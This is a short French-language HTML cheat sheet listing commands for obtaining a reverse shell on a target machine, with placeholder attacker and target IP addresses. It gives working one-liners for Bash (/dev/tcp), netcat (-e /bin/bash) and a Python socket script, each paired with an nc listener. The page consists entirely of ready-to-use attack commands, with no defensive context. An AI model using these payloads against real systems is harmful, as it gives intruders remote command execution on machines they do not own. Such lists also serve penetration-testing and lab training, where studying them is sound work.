<h2>Liste de commandes pour obtenir un reverseshell sur la machine cible</h2>

<ul>(A) Attaquant: 192.168.10.10</ul>
<ul>(C) cible: 192.168.10.100</ul>

<h3>Bash</h3>
(A) # nc -nlvp 4444 
<br/>
(C) # bash -i >& /dev/tcp/192.168.10.10/4444 0>&1
<br/>

<h3>netcat</h3>
(A) # nc -nlvp 4444 
<br/>
(C) # nc -e /bin/bash 192.168.10.10 4444 
<br/>

<h3>Python</h3>
(A) # nc -nlvp 4444 
<br/>
(C) # python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.10.10",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
<br/>





